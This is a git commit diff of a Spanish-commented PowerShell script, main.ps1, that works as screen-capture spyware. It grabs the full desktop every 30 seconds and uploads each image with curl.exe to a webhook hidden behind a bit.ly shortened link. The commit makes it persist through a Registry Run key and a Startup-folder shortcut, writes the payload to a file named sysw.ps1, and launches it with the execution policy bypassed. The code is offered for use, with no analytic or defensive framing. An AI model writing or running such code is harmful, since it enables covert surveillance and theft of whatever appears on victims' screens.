e8329434190bb8b7020d705c43aa0fd79849edc4
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-10 23:07:17 -0500

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,33 +1,54 @@
-$hookurl = "https://bit.ly/chu_kbras"
-$seconds = 30 # Intervalo entre capturas
-$a = 1 # Cantidad de capturas
+# Contenido del script principal (sysw.ps1)
+$scriptContent = @"
+# Contenido del script principal (sysw.ps1)
+\$hookurl = "https://bit.ly/chu_kbras"
+\$seconds = 30 # Intervalo entre capturas
+\$a = 1 # Cantidad de capturas
 
 # Detección de URL acortada
-if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected..000." ; $hookurl = (irm $hookurl).url}
+if (\$hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected!!!." ; \$hookurl = (irm \$hookurl).url}
 
 # Ubicación del script
-$scriptPath = $MyInvocation.MyCommand.Path
+\$scriptPath = \$MyInvocation.MyCommand.Path
 
 # Agregar entrada al registro de Windows para iniciar con el sistema
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $regPath -Name "ScreenshotScript" -Value $scriptPath
+\$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path \$regPath -Name "ScreenshotScript" -Value \$scriptPath
 
 do {
-    $Filett = "$env:temp\SC.png"
+    \$Filett = "\$env:temp\SC.png"
     Add-Type -AssemblyName System.Windows.Forms
     Add-type -AssemblyName System.Drawing
-    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $Width = $Screen.Width
-    $Height = $Screen.Height
-    $Left = $Screen.Left
-    $Top = $Screen.Top
-    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    \$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    \$Width = \$Screen.Width
+    \$Height = \$Screen.Height
+    \$Left = \$Screen.Left
+    \$Top = \$Screen.Top
+    \$bitmap = New-Object System.Drawing.Bitmap \$Width, \$Height
+    \$graphic = [System.Drawing.Graphics]::FromImage(\$bitmap)
+    \$graphic.CopyFromScreen(\$Left, \$Top, 0, 0, \$bitmap.Size)
+    \$bitmap.Save(\$Filett, [System.Drawing.Imaging.ImageFormat]::png)
     Start-Sleep 1
-    curl.exe -F "file1=@$filett" $hookurl
+    curl.exe -F "file1=@\$filett" \$hookurl
     Start-Sleep 1
-    Remove-Item -Path $filett
-    Start-Sleep $seconds
-} while ($true)
+    Remove-Item -Path \$filett
+    Start-Sleep \$seconds
+} while (\$true)
+"@
+
+# Ruta para guardar el script principal
+$output = "$env:USERPROFILE\sysw.ps1"
+
+# Guardar el contenido del script principal en un archivo
+Set-Content -Path $output -Value $scriptContent
+
+# Creación de acceso directo en la carpeta de inicio del usuario
+$shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
+$shell = New-Object -ComObject WScript.Shell
+$shortcut = $shell.CreateShortcut($shortcutLocation)
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-ExecutionPolicy Bypass -File $output"
+$shortcut.Save()
+
+# Ejecución del script principal
+Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $output"
